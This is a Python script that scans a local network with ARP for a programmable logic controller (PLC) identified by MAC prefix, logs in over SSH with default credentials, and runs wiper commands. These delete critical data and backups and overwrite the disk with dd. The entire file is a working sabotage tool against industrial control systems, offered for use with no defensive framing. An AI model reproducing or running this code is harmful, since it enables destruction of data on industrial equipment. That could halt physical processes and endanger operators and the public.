import re
import paramiko
from scapy.all import ARP, Ether, srp

def find_plc_ip():
    # Define the IP range to scan for the PLC
    ip_range = "192.168.1.0/24"
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send ARP request and receive responses
    result = srp(packet, timeout=2, verbose=0)[0]

    # Extract IP addresses of devices responding to ARP
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    # Assume the PLC has a specific MAC address prefix (e.g., 00:1D:9C)
    plc_mac_prefix = "00:1D:9C"
    for device in devices:
        if device['mac'].startswith(plc_mac_prefix):
            return device['ip']

    return None

def destroy_data(plc_ip, username, password):
    try:
        # Connect to the PLC via SSH
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(plc_ip, username=username, password=password)

        # Example command to delete critical files (adjust for your PLC's OS)
        commands = [
            "rm -rf /critical_data/*",  # Delete critical data
            "dd if=/dev/zero of=/dev/sda bs=1M",  # Overwrite storage
            "rm -rf /backup/*"  # Delete backups
        ]

        for cmd in commands:
            stdin, stdout, stderr = ssh.exec_command(cmd)
            print(f"Executed: {cmd}")
            print(stdout.read().decode())
            print(stderr.read().decode())

        ssh.close()
        print("Data destruction completed.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    # Replace with your PLC's SSH credentials
    plc_username = "admin"
    plc_password = "password"

    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"Found PLC at IP: {plc_ip}")

        # Step 2: Perform data destruction
        destroy_data(plc_ip, plc_username, plc_password)
    else:
        print("PLC not found on the network.")